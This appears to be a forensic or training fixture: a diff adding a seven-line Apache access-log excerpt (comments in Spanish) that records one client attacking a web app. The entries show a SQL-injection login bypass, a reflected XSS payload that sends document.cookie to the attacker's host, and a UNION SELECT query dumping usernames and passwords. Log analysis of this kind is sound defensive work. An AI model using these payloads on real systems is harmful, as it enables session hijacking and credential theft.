@@ -1,0 +1,7 @@
+# Extracto de access.log  ·  servidor web APP-WEB (192.168.56.20)  ·  Apache
+# Ventana: 2027-01-13  18:04 – 18:07
+203.0.113.88 - - [13/Jan/2027:18:04:55] "GET /login.php HTTP/1.1" 200 1841
+203.0.113.88 - - [13/Jan/2027:18:05:10] "POST /login.php  usuario=admin' -- HTTP/1.1" 302 0
+203.0.113.88 - - [13/Jan/2027:18:05:11] "GET /panel/index.php HTTP/1.1" 200 20551
+203.0.113.88 - - [13/Jan/2027:18:05:44] "GET /buscar.php?q=<script>document.location='http://203.0.113.88/c?'+document.cookie</script> HTTP/1.1" 200 3120
+203.0.113.88 - - [13/Jan/2027:18:06:20] "GET /productos.php?id=105+UNION+SELECT+usuario,clave+FROM+usuarios HTTP/1.1" 200 8890
